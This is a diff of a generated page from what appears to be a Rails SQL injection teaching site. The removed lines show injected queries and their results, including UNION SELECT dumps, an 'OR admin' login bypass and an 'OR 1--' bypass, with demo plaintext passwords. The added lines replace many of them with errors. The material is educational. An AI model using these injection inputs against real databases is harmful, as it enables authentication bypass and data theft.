@@ -6,7 +6,7 @@
   <link href="/assets/application-02d50f244bdf918d7985024c1ae3e6e6.css" media="all" rel="stylesheet" type="text/css" />
   <script src="/assets/application-5590d2132eb2452c01cc8a5d92358661.js" type="text/javascript"></script>
   <meta content="authenticity_token" name="csrf-param" />
-<meta content="kteva/Isc3I2xUy532EuV5hTfHzWhDodASUFAWWxuvI=" name="csrf-token" />
+<meta content="a9XWn3K5TWMGAAtGAdadPVG64uvXy6DPEJKvCgeEI0s=" name="csrf-token" />
 </head>
 <body>
   <div class="navbar navbar-fixed-top">
@@ -129,7 +129,7 @@ Clone and run this site from <a href="https://github.com/presidentbeef/inject-so
     </div>
     <strong>Result</strong>
     <div>
-      47
+      38
     </div>
   </div>
 </div>
@@ -231,7 +231,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      [#&lt;User id: 13, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 27, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 14, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 63, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 15, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 42, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 16, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 37, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 17, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 35, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 18, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 18, admin: true, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;]
+      [#&lt;User id: 13, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 29, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 14, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 56, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 15, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 46, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 16, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 54, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 17, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 51, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 18, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 47, admin: true, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;]
     </div>
   </div>
 </div>
@@ -291,11 +291,11 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
   <div class="result well">
     <strong>Query</strong>
     <div>
-      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span>  <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">AS</span> one <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> (name = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#710">'</span></span>) <span style="color:#080;font-weight:bold">or</span> (<span style="color:#B06;font-weight:bold">SELECT</span> <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">orders</span><span style="color:#710">'</span></span> <span style="color:#080;font-weight:bold">WHERE</span> total &gt; <span style="color:#00D">1</span>)<span style="color:#777">--') LIMIT 1</span></span>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">commit</span> <span style="color:#339;font-weight:bold">transaction</span></span>
     </div>
     <strong>Result</strong>
     <div>
-      true
+      Cannot visit Integer
     </div>
   </div>
 </div>
@@ -359,11 +359,11 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
   <div class="result well">
     <strong>Query</strong>
     <div>
-      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span>  <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> (name = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">name=</span><span style="color:#710">'</span></span>) <span style="color:#080;font-weight:bold">OR</span> admin = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">t</span><span style="color:#710">'</span></span> <span style="color:#777">--') LIMIT 1</span></span>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">commit</span> <span style="color:#339;font-weight:bold">transaction</span></span>
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;User id: 30, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 44, admin: true, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;
+      Cannot visit Integer
     </div>
   </div>
 </div>
@@ -407,7 +407,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      [#&lt;User id: 36, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 53, admin: true, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;]
+      [#&lt;User id: 36, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 77, admin: true, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;]
     </div>
   </div>
 </div>
@@ -449,7 +449,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      [#&lt;User id: 37, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 75, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 38, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 69, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 39, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 69, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 40, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 74, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 41, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 36, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 42, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 66, admin: true, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;]
+      [#&lt;User id: 37, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 45, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 38, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 76, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 39, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 35, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 40, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 65, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 41, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 20, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 42, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 56, admin: true, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;]
     </div>
   </div>
 </div>
@@ -487,11 +487,11 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
   <div class="result well">
     <strong>Query</strong>
     <div>
-      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">user_id</span><span style="color:#710">&quot;</span></span> = <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">GROUP</span> <span style="color:#080;font-weight:bold">BY</span> user_id <span style="color:#080;font-weight:bold">HAVING</span> total &gt; <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">UNION</span> <span style="color:#B06;font-weight:bold">SELECT</span> * <span style="color:#080;font-weight:bold">FROM</span> orders</span>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">commit</span> <span style="color:#339;font-weight:bold">transaction</span></span>
     </div>
     <strong>Result</strong>
     <div>
-      [#&lt;Order id: 22, user_id: 1, total: 10, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;Order id: 23, user_id: 3, total: 500, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;Order id: 24, user_id: 4, total: 1, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;]
+      Cannot visit Integer
     </div>
   </div>
 </div>
@@ -529,11 +529,11 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
   <div class="result well">
     <strong>Query</strong>
     <div>
-      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">user_id</span><span style="color:#710">&quot;</span></span> = <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">GROUP</span> <span style="color:#080;font-weight:bold">BY</span> user_id <span style="color:#080;font-weight:bold">HAVING</span> total &gt; <span style="color:#00D">1</span> <span style="color:#080;font-weight:bold">UNION</span> <span style="color:#B06;font-weight:bold">SELECT</span> * <span style="color:#080;font-weight:bold">FROM</span> orders</span>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">commit</span> <span style="color:#339;font-weight:bold">transaction</span></span>
     </div>
     <strong>Result</strong>
     <div>
-      [#&lt;Order id: 25, user_id: 1, total: 10, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;Order id: 26, user_id: 3, total: 500, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;Order id: 27, user_id: 4, total: 1, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;]
+      Cannot visit Integer
     </div>
   </div>
 </div>
@@ -571,11 +571,11 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
   <div class="result well">
     <strong>Query</strong>
     <div>
-      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">orders</span><span style="color:#710">&quot;</span></span> <span style="color:#777">-- WHERE &quot;orders&quot;.&quot;user_id&quot; = 1</span></span>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">commit</span> <span style="color:#339;font-weight:bold">transaction</span></span>
     </div>
     <strong>Result</strong>
     <div>
-      [#&lt;Order id: 28, user_id: 1, total: 10, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;Order id: 29, user_id: 3, total: 500, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;Order id: 30, user_id: 4, total: 1, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;]
+      Cannot visit Integer
     </div>
   </div>
 </div>
@@ -613,11 +613,11 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
   <div class="result well">
     <strong>Query</strong>
     <div>
-      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> (<span style="color:#00D">1</span>)</span>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">commit</span> <span style="color:#339;font-weight:bold">transaction</span></span>
     </div>
     <strong>Result</strong>
     <div>
-      [#&lt;User id: 61, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 53, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 62, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 20, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 63, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 41, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 64, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 48, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 65, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 55, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 66, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 26, admin: true, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;]
+      Cannot visit Integer
     </div>
   </div>
 </div>
@@ -659,7 +659,7 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
     </div>
     <strong>Result</strong>
     <div>
-      [#&lt;User id: 72, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 46, admin: true, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 67, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 37, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 68, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 26, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 69, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 26, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 70, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 53, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;, #&lt;User id: 71, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 33, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;]
+      [#&lt;User id: 72, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 18, admin: true, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 67, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 75, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 68, name: &quot;Jim&quot;, password: &quot;Jimpass&quot;, age: 33, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 69, name: &quot;Sarah&quot;, password: &quot;Sarahpass&quot;, age: 40, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 70, name: &quot;Tina&quot;, password: &quot;Tinapass&quot;, age: 32, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;, #&lt;User id: 71, name: &quot;Tony&quot;, password: &quot;Tonypass&quot;, age: 69, admin: false, created_at: &quot;2019-12-27 20:52:12&quot;, updated_at: &quot;2019-12-27 20:52:12&quot;&gt;]
     </div>
   </div>
 </div>
@@ -825,11 +825,11 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
   <div class="result well">
     <strong>Query</strong>
     <div>
-      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span>  * <span style="color:#080;font-weight:bold">FROM</span> users <span style="color:#080;font-weight:bold">WHERE</span> admin = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">t</span><span style="color:#710">'</span></span> ; <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">name</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">IS</span> <span style="color:#069">NULL</span> <span style="color:#080;font-weight:bold">AND</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">password</span><span style="color:#710">&quot;</span></span> <span style="color:#080;font-weight:bold">IS</span> <span style="color:#069">NULL</span> LIMIT <span style="color:#00D">1</span></span>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">commit</span> <span style="color:#339;font-weight:bold">transaction</span></span>
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;User id: 96, name: &quot;Admin&quot;, password: &quot;supersecretpass&quot;, age: 66, admin: true, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;
+      Cannot visit Integer
     </div>
   </div>
 </div>
@@ -867,11 +867,11 @@ The SQL for selecting the records to delete (where the injection occurs) looks l
   <div class="result well">
     <strong>Query</strong>
     <div>
-      <span class="CodeRay"><span style="color:#B06;font-weight:bold">SELECT</span>  <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>.* <span style="color:#080;font-weight:bold">FROM</span> <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">&quot;</span><span style="color:#D20">users</span><span style="color:#710">&quot;</span></span>  <span style="color:#080;font-weight:bold">WHERE</span> (name = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#710">'</span></span>) <span style="color:#080;font-weight:bold">OR</span> <span style="color:#00D">1</span><span style="color:#777">--' AND password = '') LIMIT 1</span></span>
+      <span class="CodeRay"><span style="color:#B06;font-weight:bold">commit</span> <span style="color:#339;font-weight:bold">transaction</span></span>
     </div>
     <strong>Result</strong>
     <div>
-      #&lt;User id: 97, name: &quot;Bob&quot;, password: &quot;Bobpass&quot;, age: 49, admin: false, created_at: &quot;2019-08-29 19:45:14&quot;, updated_at: &quot;2019-08-29 19:45:14&quot;&gt;
+      Cannot visit Integer
     </div>
   </div>
 </div>
